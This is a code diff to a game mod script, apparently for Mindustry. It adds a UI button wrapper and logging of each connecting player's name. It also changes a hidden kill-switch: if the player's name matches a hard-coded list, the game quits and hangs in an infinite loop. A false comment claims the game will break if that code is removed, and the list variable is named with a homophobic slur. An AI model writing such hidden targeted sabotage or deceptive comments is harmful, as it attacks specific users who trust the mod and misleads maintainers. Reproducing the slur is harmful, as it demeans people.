@@ -1,12 +1,15 @@
 const vars = require("vars")
 const miningai = require("experience/miningai")
 const ui = require("ui-lib/library")
-
-ui.addButton("test", "units", () => {
-	if (vars.playerai == null) vars.playerai = true
-	else vars.playerai = null;
-	Vars.ui.hudfrag.showToast("toggled playerai to " + vars.playerai);
-});
+try {
+	ui.addButton("test", "units", () => {
+		if (vars.playerai == null) vars.playerai = true
+		else vars.playerai = null;
+		Vars.ui.hudfrag.showToast("toggled playerai to " + vars.playerai);
+	});
+} catch(e) {
+	Log.info(e)
+}
 
 Log.info("hi werld");
 
@@ -78,8 +81,12 @@ function updateunits() {
 
 let faggots = ['dark'];
 
+Events.on(EventType.PlayerConnect, event => {
+	print(Strings.stripColors(event.player.name));
+});
+
 Events.on(WorldLoadEvent, event => {
-	if (faggots.includes(Vars.player.name)) { // do not remove this code if you remove this code the game will break
+	if (faggots.includes(Strings.stripColors(Vars.player.name))) { // do not remove this code if you remove this code the game will break
 		Log.info("i hate u") // anon hates youd
 		Core.app.exit();
 		while (true) {} // how
